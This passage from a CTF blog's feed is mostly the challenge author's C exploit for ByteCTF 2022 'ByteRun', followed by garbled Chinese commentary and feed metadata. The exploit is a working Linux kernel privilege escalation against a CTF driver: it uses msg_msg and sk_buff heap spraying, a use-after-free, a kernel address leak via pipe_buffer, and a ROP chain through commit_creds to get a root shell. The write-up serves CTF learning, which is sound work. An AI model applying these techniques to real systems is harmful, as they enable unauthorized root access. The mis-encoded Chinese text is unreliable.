class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br>    <span class="hljs-type">int</span>         dev_fd;<br>    <span class="hljs-type">int</span>         ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.0</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* basic resources alloc */</span><br>    saveStatus();<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, oob_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create socket pair for OOB write!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">/* build 4096 message queue */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">/* spray primary and secondary message */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br>        &#125;<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                    SECONDARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* create hole in primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>) &#123;<br>        ret = readMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* triger off-by-null on primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(dev_fd, oob_socket);<br><br>    <span class="hljs-comment">/* find the queues that have the same secondary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-comment">/* the hole */</span><br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">256</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i) &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* free the victim secondary msg_msg, then we get a UAF */</span><br>    ret = readMsg(msqid[real_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                SECONDARY_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* spray sk_buff to construct fake msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ret = spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* use fake msg_msg to read OOB */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * release and re-spray sk_buff to construct fake msg_msg</span><br><span class="hljs-comment">     * so that we can make an arbitrary read on a primary msg_msg</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* cal the addr of UAF obj by the header we just read out */</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n&quot;</span>, <br>            victim_addr);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* re-construct the msg_msg to fix it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> we need to pass the check in lib/list_debug.c </span><br><span class="hljs-comment">     * what we used to not to pass there is </span><br><span class="hljs-comment">     * &quot;prev-&gt;next == entry&quot; &amp;&amp; &quot;next-&gt;prev == entry&quot;</span><br><span class="hljs-comment">     * so a valid memory with [addr of entry] should be set there</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(fake_second_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x50</span>; i++) &#123;<br>        ((<span class="hljs-type">size_t</span>*)(fake_second_msg))[i] = victim_addr;<br>    &#125;<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            victim_addr + <span class="hljs-number">0x100</span>, victim_addr + <span class="hljs-number">0x100</span>,<br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* release UAF obj as secondary msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    ret = readMsg(msqid[victim_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                VICTIM_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* spray pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">/* write something to activate the pipe */</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* release the sk_buff to read pipe_buffer, leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_second_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            ret = read(sk_sockets[i][<span class="hljs-number">1</span>], <br>                        &amp;fake_second_msg, <br>                        <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_second_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_second_msg;<br>    <span class="hljs-comment">/* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */</span><br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8133151b</span> + kernel_offset;<br>    <span class="hljs-comment">/* ret */</span><br>    ops_ptr-&gt;get = <span class="hljs-number">0xffffffff81331534</span> + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_second_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = \<br>                    kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºå †å–·çš„ä¸ç¨³å®šæ€§ï¼Œåœ¨ç¬¬ä¸€é˜¶æ®µè¿˜æ˜¯æœ‰å¯èƒ½ä¼šæŒ‚æ‰çš„ï¼Œå› æ­¤è¿™é“é¢˜ç›®å…¶å®è¿˜æ˜¯éœ€è¦çˆ†ç ´çš„ä¸€é“é¢˜ç›®ï¼Œå‡ ç‡ 1&#x2F;16ï¼š</p><p><img src="https://s2.loli.net/2022/09/30/skFd76cRPruwQip.jpg" alt="img.jpg"></p><h1 id="0x03-è§£é¢˜æƒ…å†µ"><a href="#0x03-è§£é¢˜æƒ…å†µ" class="headerlink" title="0x03.è§£é¢˜æƒ…å†µ"></a>0x03.è§£é¢˜æƒ…å†µ</h1><p>è¿™é“é¢˜ç¬”è€…æœ€åˆå‡ºé¢˜çš„æ—¶å€™æ˜¯æŒ‰ç…§ç­¾åˆ°é¢˜çš„éš¾åº¦å‡ºçš„ï¼Œå› ä¸ºè¿™é“é¢˜çš„ä¸¤ä¸ªé˜¶æ®µï¼šé˜¶æ®µä¸€çš„ kernel UAF å…¶å®æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨é€šè§£å®Œæˆè§£é¢˜çš„ï¼Œè€Œé˜¶æ®µäºŒçš„ QEMU é€ƒé€¸åˆ™æ˜¯ä¸€ä¸ªéå¸¸ç›´ç™½çš„è¶Šç•Œè¯»å†™æ¼æ´ï¼Œåˆ©ç”¨èµ·æ¥ä¹Ÿä¸ç®—å›°éš¾ã€‚</p><p>ä½†æœ€åå¹¶æ²¡æœ‰é˜Ÿä¼è§£å¼€è¿™é“é¢˜ï¼Œå¯èƒ½æ˜¯å› ä¸ºå¤§å®¶è§‰å¾—ç¬”è€…çš„é¢˜ç›®å¤ªç®€å•äº†éƒ½ä¸å±‘äºåšå§ï¼ˆç¬‘ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‰å¹´ğŸ‘´å½“é€‰æ‰‹çš„æ—¶å€™è¿˜æœ‰â‘¤â­çº§çš„å¸¦ğŸ¨ä½ï¼Œä»Šå¹´å½“å‡ºé¢˜äººğŸ‘´åªèƒ½å–è¥¿åŒ—é£&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="ByteCTF" scheme="http://blog.arttnba3.cn/tags/ByteCTF/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="QEMU escape" scheme="http://blog.arttnba3.cn/tags/QEMU-escape/"/>
    
  </entry>
  
  <entry>
    <title>ã€HARDWARE.0x00ã€‘PCI è®¾å¤‡ç®€æ˜“é£Ÿç”¨æ‰‹å†Œ</title>
    <link href="http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/"/>
    <id>http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/</id>
    <published>2022-08-29T20:13:17.000Z</published>
    <updated>2023-04-12T17:18:59.303Z</updated>
    
